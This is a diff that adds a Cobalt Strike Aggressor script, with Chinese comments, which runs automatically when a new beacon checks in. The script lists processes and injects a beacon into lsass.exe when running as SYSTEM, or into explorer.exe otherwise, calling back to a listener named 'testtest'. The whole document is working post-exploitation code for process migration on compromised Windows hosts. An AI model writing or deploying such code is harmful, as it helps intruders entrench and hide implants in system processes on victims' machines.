@@ -1,0 +1,32 @@
+on beacon_initial{
+    sub callback{
+        $regex_system = '(.*\n)+lsass.exe\t\d+\t(\d+)(.*\n)+';
+        $regex_user_admin = '(.*\n)+explorer.exe\t\d+\t(\d+)(.*\n)+';
+	$user = beacon_info($1, "user");
+        # 要迁移的进程
+        $listener = "testtest";
+        # 回连的监听器名字
+        $regex = "";
+        # 根据权限选择正则表达式
+        if ("SYSTEM *" isin $user){
+            $regex = $regex_system;
+        }
+        else{
+            $regex = $regex_user_admin;
+        }
+        if ($2 ismatch $regex){
+            $pid = matched()[1];
+            $inject_pid = $pid;
+            if (-is64 $1){
+                $arch = "x64";
+            }
+            else{
+                $arch = "x86";
+            }
+            binject($1, $pid, $listener, $arch);
+        }
+    }
+    if($inject_pid != beacon_info($1,"pid")){
+        bps($1, &callback);
+    }
+}
